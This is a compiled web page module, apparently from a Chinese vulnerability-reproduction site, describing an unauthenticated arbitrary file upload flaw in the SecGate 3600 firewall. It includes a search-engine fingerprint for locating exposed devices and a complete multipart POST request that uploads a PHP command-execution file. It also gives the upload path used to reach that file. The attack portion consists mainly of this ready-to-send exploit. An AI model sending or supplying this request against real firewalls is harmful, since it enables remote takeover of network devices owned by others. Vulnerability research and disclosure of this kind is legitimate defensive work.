import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as n,e as a}from"./app-58e4a7d6.js";const t={},d=a(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>网神 SecGate 3600 防火墙 obj_app_upfile接口存在任意文件上传漏洞，攻击者通过构造特殊请求包即可获取服务器权限</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><p>网神 SecGate 3600 防火墙</p><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>fid=&quot;1Lh1LHi6yfkhiO83I59AYg==&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230828164646671.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>出现漏洞的文件 webui/modules/object/app.mds</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230828164658709.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>代码中没有对文件调用进行鉴权，且文件上传路径为可访问路径，造成任意文件上传</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230828164714010.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /?g=obj_app_upfile HTTP/1.1
Host: 
Accept: */*
Accept-Encoding: gzip, deflate
Content-Length: 574
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
User-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)

------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;

10000000
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;vulntest.php&quot;
Content-Type: text/plain

&lt;?php system(&quot;id&quot;);unlink(__FILE__);?&gt;

------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name=&quot;submit_post&quot;

obj_app_upfile
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name=&quot;__hash__&quot;

0b9d6b1ab7479ab69d9f71b05e0e9445
------WebKitFormBoundaryJpMyThWnAxbcBBQc--
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>默认上传路径 /secgate/webui/attachements/ ， 访问 attachements/xxx.php 文件</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230828164734911.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,16),s=[d];function l(r,o){return i(),n("div",null,s)}const p=e(t,[["render",l],["__file","网神 SecGate 3600 防火墙 obj_app_upfile 任意文件上传漏洞.html.vue"]]);export{p as default};
